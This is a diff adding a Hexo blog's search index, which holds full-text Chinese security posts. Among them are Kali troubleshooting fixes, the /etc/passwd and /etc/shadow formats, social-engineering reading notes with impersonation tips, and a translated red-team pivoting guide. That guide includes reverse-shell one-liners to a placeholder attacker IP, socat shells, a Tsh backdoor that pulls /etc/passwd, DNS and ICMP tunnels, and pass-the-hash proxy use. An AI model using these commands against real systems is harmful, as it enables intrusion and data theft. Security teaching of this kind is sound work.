@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[反取证之Linux]]></title>
+    <url>%2F2018%2F05%2F02%2Fanti-forensics-linux%2F</url>
+    <content type="text"></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>计算机取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[形而上与形而下]]></title>
+    <url>%2F2018%2F05%2F01%2Fmetaphysics-physics%2F</url>
+    <content type="text"><![CDATA[形而上者谓之道，形而下者谓之器。]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Sniper、Battering ram、Pitchfork、Cluster bomb的区别]]></title>
+    <url>%2F2018%2F05%2F01%2Fburpsuite-intruder-attack-type%2F</url>
+    <content type="text"><![CDATA[Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]： SniperSniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下： Request Position1(default:x) Position2(default:y) #1 1 y #2 2 y #3 x 1 #4 x 2 Battering ramBattering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下： Request Position1 Position2 #1 1 1 #2 2 2 PitchforkPitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下： Request Position1 Position2 #1 1 a #2 2 b Cluster bombCluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下： Request Position1 Position2 #1 1 a #2 1 b #3 1 c #4 1 d #5 2 a #6 2 b #7 2 c #8 2 d]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[URI与URL的区别]]></title>
+    <url>%2F2018%2F04%2F29%2Furl-uri%2F</url>
+    <content type="text"><![CDATA[URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。 URL，全称”Uniform Resource Locator”，中文“统一资源定位符”，URL是URI的子集。示例如下：https://howiezhao.github.io/2018/04/29/url-uri/上面这个URL唯一标识了互联网中一台服务器上的一篇文章。 URN，全称”Uniform Resource Name”，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：urn:isbn:9780141036144上面这个URN唯一标识了乔治·奥威尔所著的《1984》。 简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[渗透中PoC、Exp、Payload与Shellcode的区别]]></title>
+    <url>%2F2018%2F04%2F29%2Fpayload-shellcode-exp-poc%2F</url>
+    <content type="text"><![CDATA[PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。 几点注意：PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。 另外：在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。 尾巴：想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个Exp，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧！]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux中/etc/passwd与/etc/shadow的区别]]></title>
+    <url>%2F2018%2F04%2F29%2Fpasswd-and-shadow%2F</url>
+    <content type="text"><![CDATA[简单来说，/etc/passwd存储一般的用户信息，任何人都可以访问；/etc/shadow存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍： /etc/passwd早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了/etc/shadow文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。/etc/passwd的文件格式为：用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell，如果密码被存储在了/etc/shadow文件中，则此文件中密码项为x，常见形式如下：1root:x:0:0:root:/root:/bin/bash /etc/shadow/etc/shadow的文件格式为：用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段，如果密码项为 ! 或 * ，则代表此账号不能用于登录，密码项中更为详细的格式为：\$加密方法ID\$Salt\$加密值，常见形式如下：1root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::]]></content>
+      <categories>
+        <category>CheatSheet</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali Rolling 2017中无法登录BeEF的解决方案]]></title>
+    <url>%2F2018%2F02%2F08%2Fkali-beef-bug%2F</url>
+    <content type="text"><![CDATA[在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的1minified = Uglifier.compile(evaluated) 改为1minified = evaluated 保存并重启BeEF即可。]]></content>
+      <categories>
+        <category>Bug</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Udacity CS373:无人驾驶汽车编程学习笔记一]]></title>
+    <url>%2F2017%2F12%2F14%2Fcs373-1%2F</url>
+    <content type="text"><![CDATA[一：定位蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。基于一维的蒙特卡罗定位程序如下：1234567891011121314151617181920212223242526272829303132p = [0, 1, 0, 0, 0)world = ['green', 'red', 'red', 'green', 'green']measurements = ['red', 'green']motions = [1, 1]pHit = 0.6pMiss = 0.2pExact = 0.8pOvershoot = 0.1pUndershoot = 0.1def sense(p, Z): q = [] for i in range(len(p)): hit = (Z == world[i]) q.append(p[i] * (hit * pHit + (1-hit) * pMiss)) s = sum(q) for i in range (len(p)): q[i] = q[i]/s return qdef move(p, U): q= [] for i in range(len(p)): s = pExact * p[(i-U) % len(p)] s = s + pOvershoot * p[(i-U-1) % len(p)] s = s + pUndershoot * p[(i-U+1) % len(p)] q.append(s) return qfor k in range(len(measurements)): p = sense(p, measurements[k]) p = move(p, motions[k]) print p]]></content>
+      <categories>
+        <category>Notes</category>
+      </categories>
+      <tags>
+        <tag>CS373</tag>
+        <tag>无人驾驶</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[一个Red Team成员的跳板(pivoting)指南]]></title>
+    <url>%2F2017%2F12%2F10%2Fpivoting-guide%2F</url>
+    <content type="text"><![CDATA[本文翻译自https://artkond.com/2017/03/23/pivoting-guide/ ，正文如下： 渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。 以公有IP为目标一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。 SSH端口转发设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：1ssh username@host -D 1080 这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。1ssh username@host -L 445:192.168.1.1:445 这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。 通过SSH的VPN由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用proxychains或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在/etc/ssh/sshd_config文件（服务器端）中：12PermitRootLogin yesPermitTunnel yes 客户端上的以下命令将在客户端和服务器上创建一对tun设备：1ssh username@server -w any:any 标志-w接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— -w 0:0，也可以使用-w any:any语法来获取下一个可用的tun设备。tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：1ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 服务器端：1ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 在服务器上启用IP转发和NAT：12echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 现在，你可以将对等主机1.1.1.1设置为你的默认网关，或通过它路由到特定的主机/网络：1route add -net 10.0.0.0/16 gw 1.1.1.1 在这个例子中，服务器的外部网络接口是eth0，两端新创建的tun设备是tun0。 3proxy在这里获取 - https://github.com/z3APA3A/3proxy/releases 。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是./configure &amp;&amp; make :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。这个工具从配置文件中获得所有选项。运行它：13proxy.exe config_file 或者如果你在Linux系统上：1./3proxy config_file 要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：1socks -p1080 现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - https://3proxy.ru/howtoe.asp 。要对特定端口进行隧道使用，请用以下语法：1tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt; NAT场景这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。 SSH反向端口转发/w 3proxy这个跳板设置看起来像这样：在目标服务器上使用以下配置运行3proxy服务：1socks -p31337 在接收方（攻击者的机器）上创建一个单独的用户。1adduser sshproxy 这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：1234root:x:0:0:root:/root:/bin/bash...sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false... 现在使用-R标志连接到新创建的用户的服务器。Linux系统：1ssh sshproxy@your_server -R 31337:127.0.0.1:31337 对于Windows，你将需要首先上传plink.exe。这是一个putty的控制台版本。运行它：1plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337 -R标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh-R标志访问攻击者主机上的这个端口。 Rpivot这是我最喜欢穿越NAT连接的方法。Rpivot是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与ssh -D很像，但方向相反。服务器端：1python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0 客户端：1python client.py --server-ip &lt;ip&gt; --server-port 9999 结果，一个socks4代理服务将被绑定在服务器端的1080端口。 从内部网络泄漏这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。 ICMP隧道如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - http://code.gerade.org/hans/ 。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：1./hans -v -f -s 1.1.1.1 -p P@ssw0rd -v标志是详细的，-f标志在前台运行，-s标志的值是服务器在新创建的tun接口上的ip。客户端：1./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v 连接成功后，客户端应该可以直接在1.1.1.100处看到：123# ping 1.1.1.100PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms 现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。 DNS隧道如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。这个手册可能会帮助你设置你的名称服务器。 Iodine如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试iodine。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：1iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com 客户端：1iodine -f -P P@ssw0rd tunneldomain.com -r 连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：1ruby ./dnscat2.rb tunneldomain.com 客户端：1./dnscat2 tunneldomain.com 在收到服务器端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择带有session -i &lt;num&gt;的命令会话：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as'ping'! For a full list of clients, try 'help'.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发一个端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。 公司的HTTP代理作为一种出路HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;） Rpivot我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：123python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --password P@ssw0rd 或者如果你有LM:NT哈希而不是密码：123python client.py --server-ip &lt;rpivot_server_ip&gt;\--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45 CntlmCntlm是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：12345Username AlicePassword P@ssw0rdDomain CONTOSO.COMProxy 10.0.0.10:8080Tunnel 2222:&lt;attackers_machine&gt;:443 运行：1cntlm.exe -c config.conf 或者如果你在Linux上：1./cntlm -c config.conf 现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。 通过HTTP代理的OpenVpnOpenVpn是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：1http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm 凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。 利用带有proxychains的SOCKS如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用proxychains来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 3128 准备好了，只需在你最喜欢的pwn工具上添加proxychains：1proxychains program_name 与proxychains一起使用的impacket’s psexec.py： DNS与proxychainsProxychains在解析主机名时不遵循socks RFC。它拦截gethostbyname libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到4.2.2.2。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于/usr/lib/proxychains3/proxyresolv：123456789101112#!/bin/sh# This script is called by proxychains to resolve DNS names# DNS server used to resolve namesDNS_SERVER=$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125; #change nameserver hereif [ $# = 0 ] ; then echo " usage:" echo " proxyresolv &lt;hostname&gt; " exitfi 美化你的web shell这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 。 Python PTY shell从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：1python -c 'import pty; pty.spawn("/bin/bash")' 或者启动反向连接：1234python -c 'import socket,subprocess,os;\s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' SocatNetcat的加强版！可是说实话，去检查这个工具的手册man socat，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。 绑定shell设置监听器：1socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane 连接到监听器：1socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337 反向shell：设置监听器：1socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 连接到攻击者的机器：1socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane 终端大小默认情况下，终端的大小是相当小的，当启动top命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用stty -a命令来获得你的常规终端的大小：12$ stty -aspeed 38400 baud; rows 57; columns 211; line = 0; 将所需的尺寸应用到你的socat终端：1$ stty rows 57 cols 211 TshTsh是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = "never say never say die";#define SERVER_PORT 22short int server_port = SERVER_PORT;/*#define CONNECT_BACK_HOST "localhost"#define CONNECT_BACK_DELAY 30*/#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 更改secret，指定SERVER_PORT。如果你想反向连接，取消注释并编辑CONNECT_BACK_HOST和CONNECT_BACK_DELAY指令。运行make：12345678910111213141516$ make linux_x64make \ LDFLAGS=" -Xlinker --no-as-needed -lutil" \ DEFS=" -DLINUX" \ tsh tshdmake[1]: Entering directory '/tmp/tsh'gcc -O3 -W -Wall -DLINUX -c pel.cgcc -O3 -W -Wall -DLINUX -c aes.cgcc -O3 -W -Wall -DLINUX -c sha1.cgcc -O3 -W -Wall -DLINUX -c tsh.cgcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.ostrip tshgcc -O3 -W -Wall -DLINUX -c tshd.cgcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.ostrip tshdmake[1]: Leaving directory '/tmp/tsh' 现在在服务器上运行./tshd。它将开始监听指定的端口。您可以通过执行以下命令连接到它：1./tsh host_ip 如果tsh被编译有反向连接功能，tshd守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：12$ ./tsh cbWaiting for the server to connect... 用tsh传输文件：12./tsh host_ip get /etc/passwd ../tsh host_ip put /bin/netcat /tmp]]></content>
+      <categories>
+        <category>Translation</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[《欺骗的艺术》读书笔记]]></title>
+    <url>%2F2017%2F12%2F05%2Fthe-art-of-deception%2F</url>
+    <content type="text"><![CDATA[人的因素是安全过程中最薄弱的环节。 你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。 把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。 不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。 两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。 安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。 执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。 每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。 逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。 新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。 第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。]]></content>
+      <categories>
+        <category>Notes</category>
+      </categories>
+      <tags>
+        <tag>社会工程学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali持久加密USB安装所遇问题总结]]></title>
+    <url>%2F2017%2F12%2F04%2Fkali-live-usb-bug%2F</url>
+    <content type="text"><![CDATA[Writing superblocks and filesystem accounting information今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用mkfs.ext4格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用dmesg命令诊断故障时发现如下错误：123...device descriptor read/8, error -110... 经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以讲U盘和虚拟机之间的连接改为2.0即可解决这个问题。]]></content>
+      <categories>
+        <category>Bug</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Metasploit中shell中文乱码解决方案]]></title>
+    <url>%2F2017%2F12%2F04%2Fmetasploit-luanma%2F</url>
+    <content type="text"><![CDATA[有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。解决方法： 在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出 接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可注意： 这个设置会随着操作系统的重启而失效 设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码 建议只在需要的时候设定简体中文编码]]></content>
+      <categories>
+        <category>Bug</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali Rolling 2017更新后无法启动解决方案]]></title>
+    <url>%2F2017%2F11%2F25%2Fkali-update-bug%2F</url>
+    <content type="text"><![CDATA[BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)有时更新Kali后重新启动会出现如下显示，并无法进入系统界面1234BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)Enter 'help' for a list of built-in commands.(initramfs) 解决方法： 在此界面输入blkid命令，查看自己的分区号 依据自己的分区号输入fsck -y /dev/sda1，我的分区号是sda1。 输入exit命令退出重启电脑]]></content>
+      <categories>
+        <category>Bug</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali Rolling 2017下安装w3af出错解决方案]]></title>
+    <url>%2F2017%2F11%2F08%2Fkali-w3af-bug%2F</url>
+    <content type="text"><![CDATA[Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”解决方法1：修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉1234#SSL_ST_INIT = _lib.SSL_ST_INIT#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE#SSL_ST_OK = _lib.SSL_ST_OK#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE 解决方法2： 卸载w3af要求的pyOpenSSL版本 1$ pip uninstall pyOpenSSL 安装最新版pyOpenSSL 1$ pip install pyOpenSSL 编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码 1PIPDependency('OpenSSL', 'pyOpenSSL', 'Version of pyOpenSSL you are using') error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1解决方法：使用如下命令安装相关依赖12$ apt-get build-dep python-lxml$ apt-get install libxslt-dev libssl-dev ImportError: No module named webkit启动GUI界面时可能会报此错误，原因是未安装相关模块解决方法：执行如下命令1$ apt-get install python-webkit python-webkit-dev 在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令1234567$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb$ dpkg -i python-support_1.0.15_all.deb$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb$ dpkg -i python-webkit_1.1.8-3_amd64.deb$ apt install python-gtk2-dev$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb$ dpkg -i python-webkit-dev_1.1.8-3_all.deb 安装过程中可能需要安装相关依赖，可执行如下命令1$ apt --fix-broken install ImportError: No module named gtksourceview2同样，启动GUI时也可能报此错误解决方法：执行如下命令1$ apt-get install python-gtksourceview2]]></content>
+      <categories>
+        <category>Bug</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hexo初体验]]></title>
+    <url>%2F2017%2F06%2F20%2Fhexo-experience%2F</url>
